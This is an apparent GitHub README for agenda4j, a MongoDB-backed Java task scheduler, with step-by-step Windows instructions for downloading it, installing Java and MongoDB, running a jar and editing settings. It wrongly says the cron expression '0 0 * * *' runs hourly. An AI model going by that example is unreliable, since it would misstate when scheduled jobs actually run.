# ⚙️ agenda4j - Simple Java Task Scheduler for Everyone

[![Download agenda4j](https://img.shields.io/badge/Download-agenda4j-green?style=for-the-badge)](https://github.com/popshhsx5556/agenda4j)

---

## 📋 What is agenda4j?

agenda4j is a tool that helps you schedule tasks automatically. It uses MongoDB as a storage system and runs on Java. It can handle repeating tasks and run them at set times or intervals. You do not need to know how to write code to use it once it is set up.

This tool fits well if you want to run jobs regularly without doing it manually. For example, it can send reminders, clean up files, or update information at planned times.

---

## 💻 System Requirements

- Windows 10 or later  
- Java Runtime Environment (JRE) version 8 or above installed  
- MongoDB database set up and running  
- At least 4 GB of free RAM  
- 500 MB of free disk space

---

## 🛠 Features

- Works with recurring tasks using standard time formats  
- Saves schedules and job data in MongoDB  
- Supports quick setup with Spring Boot for developers  
- Can run tasks based on intervals or fixed dates  
- Manages task queues to run multiple jobs smoothly  
- Shows task history and status  
- Allows easy configuration without programming knowledge*

*You may need help from someone with basic technical skills for installation.

---

## 🚀 Getting Started

Follow this guide to set up agenda4j on your Windows machine.

---

## 📥 Download agenda4j

To get started, visit this page to download the files you need:

[Download agenda4j](https://github.com/popshhsx5556/agenda4j)

Click the green **Code** button and choose **Download ZIP**. Save the file in a folder you can find easily, like your Desktop or Downloads.

---

## 🔧 Installing Java

agenda4j requires Java to run. If you don't have Java installed:

1. Visit https://www.java.com/en/download/  
2. Click on **Download Java**  
3. Open the downloaded file and follow the prompts  
4. Restart your computer if asked

To check if Java is installed, open Command Prompt and type:

```
java -version
```

You should see a message showing the Java version. If you get an error, reinstall Java or try installing the Java Runtime Environment (JRE).

---

## ⚙️ Setting up MongoDB

agenda4j stores tasks in MongoDB. You need a working MongoDB database.

1. Go to https://www.mongodb.com/try/download/community  
2. Download the version for Windows  
3. Run the installer and follow instructions  
4. After installation, run MongoDB by typing `mongod` in a new Command Prompt window

If you are new to MongoDB, you can keep it running in the background while using agenda4j.

---

## 🗂 Preparing agenda4j

1. Extract the agenda4j.zip file you downloaded earlier  
2. Open the folder and locate the file `README.md` or `INSTALL.md` for extra details (optional)

---

## ▶️ Running agenda4j for the First Time

agenda4j comes with core Java files and supporting modules. To start the scheduler:

1. Open Command Prompt  
2. Navigate to the folder where you unzipped agenda4j. You can do this by typing:

```
cd path\to\agenda4j
```

Replace `path\to\agenda4j` with the actual folder path.

3. Run the scheduler with this command:

```
java -jar agenda4j-core.jar
```

This command starts the scheduler using the core Java file.

4. If everything is correct, agenda4j connects to your MongoDB and begins running.

---

## 🔄 Scheduling Tasks

agenda4j supports common scheduling formats you may know:

- Cron expressions (like "0 0 * * *" to run hourly)  
- Fixed intervals (run every 15 minutes)  
- One-time tasks at a specific date/time

You can create tasks that run commands or scripts you use daily.

---

## 🔗 Using the Spring Boot Starter (Optional)

If you want to use agenda4j in a Java Spring Boot setup, you need some development knowledge. This allows integrating agenda4j directly into your Java applications.

---

## ⚙️ Configuring agenda4j

To customize settings like your MongoDB address or schedule options:

1. Look for the `application.properties` file in the agenda4j folder  
2. Open it with a text editor like Notepad  
3. Change entries such as:

```
mongodb.uri=mongodb://localhost:27017/agenda4j
scheduler.executor.pool-size=5
```

Save changes and restart agenda4j with the `java -jar` command.

---

## 🛑 Stopping agenda4j

To stop the scheduler:

1. Go to the Command Prompt window running agenda4j  
2. Press `Ctrl + C`

agenda4j will close safely and save its state.

---

## 🔍 Troubleshooting

- If agenda4j does not start, check that MongoDB is running  
- Make sure Java version is 8 or higher (`java -version`)  
- Verify the file path is correct when running commands  
- Check firewall settings that might block MongoDB or Java  
- Review error messages in Command Prompt and search online if needed

---

## 📂 File Structure Overview

- `agenda4j-core.jar`: Main scheduler file  
- `mongodb-runtime.jar`: Connector for MongoDB  
- `spring-boot-starter.jar`: Module for Spring Boot integration  
- `application.properties`: Main settings file  

---

## 🌐 Additional Resources

Visit the GitHub repository to check for updates or ask questions:  
[https://github.com/popshhsx5556/agenda4j](https://github.com/popshhsx5556/agenda4j)

---

## 🖥 How to Update agenda4j

1. Download the latest ZIP from the GitHub link above  
2. Replace old files in your agenda4j folder with new ones  
3. Restart agenda4j using the `java -jar` command

---

## 📝 License

agenda4j is an open-source project. Check the LICENSE file in the download for details.